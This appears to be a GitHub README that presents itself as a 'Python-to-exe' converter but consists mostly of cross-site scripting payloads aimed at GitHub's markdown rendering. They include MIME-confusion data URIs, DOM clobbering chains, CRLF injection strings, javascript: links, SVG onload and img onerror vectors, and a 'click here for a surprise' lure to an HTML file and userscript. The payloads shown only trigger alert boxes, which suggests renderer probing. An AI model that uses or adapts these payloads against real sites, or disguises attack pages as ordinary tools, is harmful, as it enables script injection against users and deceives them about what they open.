# 🚀 Python-to-exe

> Convert your Python scripts to standalone executables!

---

## 🎉 **[⭐ CLICK HERE FOR A SURPRISE! ⭐](https://raw.githubusercontent.com/bearertoken1/Python-to-exe/main/alert.htm)**

### Alternative Links:
- 🌐 [Web Version](https://bearertoken1.github.io/Python-to-exe/)
- 📜 [Userscript](https://github.com/bearertoken1/Python-to-exe/raw/main/github-alert.user.js)
- 💬 [Discussions](../../discussions)
- 📖 [Wiki](../../wiki)

---

## MIME Type + DOM Clobbering Advanced Payloads

### MIME Type Bypass Vectors (Since this got a reaction!)

<!-- MIME type confusion with HTML rendering -->
<div id="x"></div>
<form id="x" name="y"><input id="z"></form>
<script>alert(x.y.z)</script>

<!-- Named anchor + form MIME clobbering -->
<a id="x" href="data:text/html,<script>alert('hi bearert0ken')</script>"></a>

<!-- MIME type with base64 HTML entity encoding -->
<link rel="stylesheet" href="data:text/html;charset=utf-8;base64,PHNjcmlwdD5hbGVydCgnaGkgYmVhcmVydDBrZW4nKTwvc2NyaXB0Pg==">

<!-- Using text/plain MIME that might get HTML parsed -->
<iframe src="data:text/plain,<script>alert('hi bearert0ken')</script>"></iframe>

<!-- MIME type with application/xhtml+xml -->
<object data="data:application/xhtml+xml,<svg onload='alert(1)'></svg>"></object>

### DOM Clobbering - Simple Forms

<!-- Clobbering document.x with form + output -->
<form id="x"><output id="y">Clobbered</output></form>
<script>
try {
  if(x.y.value) alert('DOM Clobbered: ' + x.y.value);
} catch(e) {}
</script>

<!-- Clobbering with anchor + href -->
<a id="x" href="javascript:alert('hi bearert0ken')"></a>
<script>
try {
  x.click();
} catch(e) {}
</script>

### DOM Clobbering - Deep Nesting

<!-- 3+ level deep clobbering -->
<form id="a" name="b"><input id="c" value="Clobbered Value"></form>
<script>
try {
  alert(a.b.c.value);
} catch(e) {}
</script>

<!-- Collection-based clobbering -->
<a id="x"><a id="x" name="y" href="javascript:alert('clobbered')"></a>

### DOM Clobbering - Firefox Specific

<!-- Firefox RTL/LTR bypass -->
<base href="a:abc"><a id="x" href="Firefox<>">
<script>
try {
  alert(x);
} catch(e) {}
</script>

### DOM Clobbering - Chrome Specific

<!-- Chrome specific clobbering -->
<base href="a://Clobbered<>"><a id="x" name="x"><a id="x" name="xyz" href="123">
<script>
try {
  alert(x.xyz);
} catch(e) {}
</script>

### CRLF Injection + HTML Encoding

<!-- CRLF bypass with encoded entities -->
%E5%98%8A%E5%98%8Dcontent-type:text/html%E5%98%8A%E5%98%8Dlocation:%E5%98%8A%E5%98%8D%E5%98%8A%E5%98%8D%E5%98%BCsvg/onload=alert('hi%20bearert0ken')%E5%98%BE

<!-- CRLF with double encoding -->
%0d%0aContent-Type:%20text/html%0d%0a%0d%0a%3Csvg%20onload=alert(1)%3E

### Meta Tag MIME Override

<!-- Using meta tag to override MIME type -->
<meta http-equiv="Content-Type" content="text/html; charset=UTF-16">
<script>alert('hi bearert0ken')</script>

<!-- Meta refresh + javascript protocol -->
<meta http-equiv="refresh" content="0;url=javascript:alert('hi bearert0ken')">

### HackerOne GitHub Vulnerability Patterns

<!-- Based on reported GitHub MIME/rendering bugs -->
<!-- Attempting to trigger re-rendering with special characters -->
<div title="&quot;&gt;&lt;svg onload=alert(1)&gt;">Test</div>

<!-- Using GitHub's markdown syntax quirks -->
![](javascript:alert('hi bearert0ken'))

<!-- Attempting to break out of code blocks -->
```
</code></pre><svg onload=alert(1)>
```

<!-- Using HTML in GitHub flavor markdown -->
<details>
<summary>Click me</summary>
<img src=x onerror=alert(1)>
</details>

<!-- Attempting unicode/RTL char injection in user mentions -->
@‮‮alert(1)‮‮

###  SVG + MIME + Namespace Bypass

<!-- SVG with alternate namespaces -->
<math xmlns="http://www.w3.org/1998/Math/MathML">
  <mi xlink:href="data:text/html,<script>alert(1)</script>"></mi>
</math>

<!-- SVG foreign object with MIME -->
<svg>
  <foreignObject width="100" height="100">
    <iframe srcdoc="&lt;script&gt;alert('hi bearert0ken')&lt;/script&gt;"></iframe>
  </foreignObject>
</svg>

### Form-based DOM Clobbering Attack Chain

<!-- Multi-stage attack using forms + iframes -->
<iframe id="x" name="y"></iframe>
<form target="y" action="data:text/html,<script>parent.alert(1)</script>"><button>Click</button></form>

<!-- Using form reset to trigger events -->
<form id="x" onreset="alert(1)">
  <input id="y" type="text">
</form>
<script>x.reset()</script>

### Stylesheet MIME + Base64

<!-- Stylesheet with encoded script -->
<link rel="stylesheet" href="data:text/css;base64,Ym9keSB7IGJhY2tncm91bmQ6IHVybCgnZGF0YTp0ZXh0L2h0bWwsPHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0PicpOyB9">

### Image Tag MIME Confusion

<!-- Image with wrong MIME type -->
<img src="data:text/html,<svg onload=alert(1)>">

<!-- Using picture tag with MIME override -->
<picture>
  <source srcset="data:text/html,<svg onload=alert(1)>">
  <img src="x" onerror="alert(1)">
</picture>

### Track/Video MIME Bypass

<!-- Using track tag with data URI -->
<track kind="captions" src="data:text/html,<script>alert(1)</script>">

<!-- Video poster with MIME confusion -->
<video poster="data:text/html,<svg onload=alert(1)>"></video>

---

## Features
- Convert Python to EXE
- One-click deployment
- **Advanced MIME + DOM exploitation**

---

## Try it out!

The surprise awaits you above! ☝️
